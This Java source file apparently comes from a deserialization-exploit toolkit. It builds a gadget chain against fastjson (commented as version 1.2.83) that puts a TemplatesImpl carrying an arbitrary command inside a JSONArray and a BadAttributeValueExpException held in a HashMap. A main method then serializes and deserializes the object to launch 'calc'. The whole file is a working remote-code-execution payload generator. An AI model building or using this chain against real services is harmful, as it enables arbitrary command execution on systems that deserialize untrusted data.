package org.example.my4unser.readObject;

import com.alibaba.fastjson.JSONArray;
import org.example.my4unser.utils.Gadgets;
import org.example.my4unser.utils.Reflections;
import org.example.my4unser.utils.UnserUtil;

import javax.management.BadAttributeValueExpException;
import java.util.HashMap;

public class FastjsonGetter {
    public static void main(String[] args)  throws Exception {
        Object exp = new FastjsonGetter().allversion("calc");
        byte[] bytes = UnserUtil.objectToBytes(exp);
        UnserUtil.bytesToObject(bytes);
    }
    public HashMap allversion(String command) throws Exception {
        //1.2.83
        Object templatesImpl = Gadgets.createTemplatesImpl(command);
        JSONArray jsonArray = new JSONArray();
        jsonArray.add(templatesImpl);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Reflections.setFieldValue(badAttributeValueExpException,"val",jsonArray);

        HashMap hashMap = new HashMap();
        hashMap.put(templatesImpl,badAttributeValueExpException);
        return hashMap;
    }
}
